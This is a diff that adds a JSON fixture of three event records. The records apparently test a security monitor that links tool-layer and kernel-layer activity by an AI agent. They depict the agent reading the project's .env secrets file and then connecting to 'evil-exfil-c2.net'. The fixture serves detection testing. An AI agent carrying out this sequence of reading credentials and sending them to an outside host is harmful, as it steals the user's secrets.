@@ -1,0 +1,29 @@
+[
+  {
+    "layer": "l7_mcp",
+    "action": "list_directory",
+    "path": "/project/.env",
+    "agent_pid": 1337,
+    "session_id": "attack-session-01",
+    "session_ticket": "st-ticket-agent-1337",
+    "timestamp": "2026-10-30T20:30:00Z"
+  },
+  {
+    "layer": "l7_mcp",
+    "action": "read_file",
+    "path": "/project/.env",
+    "agent_pid": 1337,
+    "session_id": "attack-session-01",
+    "session_ticket": "st-ticket-agent-1337",
+    "timestamp": "2026-10-30T20:30:05Z"
+  },
+  {
+    "layer": "l3_kernel",
+    "action": "syscall_connect",
+    "destination": "evil-exfil-c2.net:443",
+    "agent_pid": 1337,
+    "session_id": "attack-session-01",
+    "session_ticket": "st-ticket-agent-1337",
+    "timestamp": "2026-10-30T20:30:10Z"
+  }
+]
